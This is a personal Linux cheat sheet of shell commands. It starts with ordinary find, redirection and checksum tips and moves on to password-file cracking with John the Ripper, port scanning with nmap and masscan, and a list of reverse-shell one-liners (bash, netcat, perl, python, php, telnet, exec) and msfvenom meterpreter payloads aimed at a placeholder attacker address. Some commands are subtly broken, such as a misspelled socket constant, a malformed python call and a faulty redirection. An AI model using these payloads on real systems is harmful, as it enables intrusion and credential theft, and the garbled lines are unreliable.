Linux
======

change default application
  - open file browser, such as **pcmanfm**, right click the file and select **open with**.
  - choose the program or shell command, then select some checkbox with label "always open this kind of file .."

zathura clipboard
  1. in viewer, :code:``set selection-clipboard clipboard``
  #. in ``~/.config/zathura/zathurarc`` or ``/etc/zathurarc`` add the above command


find
  1. `link <https://wangchujiang.com/linux-command/c/find.html>`_
  #. :code:`find . type f -size +10k`
  #. :code:`find . type f -atime -7`
  #. :code:`find . -maxdepth 3 -type f`
  #. :code:`find . -mindepth 2 -type f`
  #. :code:`find /home -name "*.txt" -o -name "*.pdf"`
  #. :code:`find . -regex ".*\(\.txt\|\.pdf\)$"`
  #. :code:`find . -type f -name "*.txt" -delete`
  #. :code:`find . -type f -perm 777`
  #. :code:`find . -type f -user root -exec chown tom {} \;`
  #. :code:`find . -type f -mtime +30 -name "*.log" -exec cp {} old \;`
  #. :code:`find . -name "*.java"|xargs cat | gerp -v ^$|wc -l`


John the Ripper
  1. unshadow /etc/passwd /etc/shadow > test_passwd
  #. john --word-list=path_to_wordlist test_passwd


arp -l


nmap
  1. nmap -Pn -p22,80,111,49780 -A -oN nmap.txt IP
  #. nmap -v -sV IP/sub_net


masscan
  1. :code:`masscan -p1-65535,U:1-65535 IP --rate=1000`


checksum
  1. :code:`echo 'hello world' | md5sum -`
  #. :code:`echo 'hello world' | sha256sum -`
  #. :code:`echo 'hello world' | sha512sum -`


redirect input/output
  1. :code:`cmd >&n` send output to file descriptor n
  1. :code:`cmd m>&n` send file descriptor m to file descriptor n
  #. :code:`cmd > file 2>1` redirect stderr to stdout, then redict both to file.
  #. :code:`cmd &> file` redirect stderr and stdout to file
  #. :code:`cmd >& file` redirect stderr and stdout to file
  #. :code:`cmd >& file 0>&1` redicrect stderr, stdout, stdin to file


sudo
  1. :code:`echo password | sudo -S comamnd`


reverse shell
  1. bash

     - attacker: :code:`nc -nvlp 4444`
     - target: :code:`bash -i >& /dev/tcp/attack_ip/attack_port 0>&1` 

  #. telnet

     - attacker: :code:`nc -nvlp 4444; nc -nvlp 5555`
     - target: :code:`telnet attack_ip 4444 | /bin/bash | telnet attack_ip 5555`

  #. netcat

     - attacker: :codee:`nc -nvlp 4444`
     - target: :code:`nc -v attack_ip 4444 -e /bin/bash`

  #. perl

     - attacker: :code:`nc -nvlp 4444`
     - target: :code:`perl -e 'use Socket;$i="attack_ip";$p=4444;socket(S,PF_INET,SOCK_STEAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">$S");exec("/bin/bash -i");};'`

  #. python

    - attacker: :code:`nc -nvlp 4444`
    - target: :code:`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect("attacker_ip",attacker_port);os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i]);'`

  #. php

     - attacker: :code:`nc -nvlp 4444`
     - target: :code:`php -r '$sock=fsockopen("attack_ip", attack_port);exec("/bin/bash -i <&3 >&3 2>&3");'`

  #. msf

     - php: :code:`msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=attacker_port -f raw > /root/shell.php`
     - windows: :code:`msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=attacker_port -f exe > /root/hacker.exe`
     - linux: :code:`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=attacker_port -f elf > /root/shell`
     - attacker 

       - :code:`use exploit/multi/handler`
       - :code:`set payload windows/meterpreter/reverse_tcp`
       - :code:`set LHOST attacker_ip`
       - :code:`set LPORT attacker_port`
       - :code:`run # or exploit`

  #. exec

     - attacker: :code:`nc -nvlp 4444`
     - target: :code:`exec 5<>/dev/tcp/attacker_ip/attacker_port; cat <&5 | while read line; do $line 2>&5 >&5; done`

    
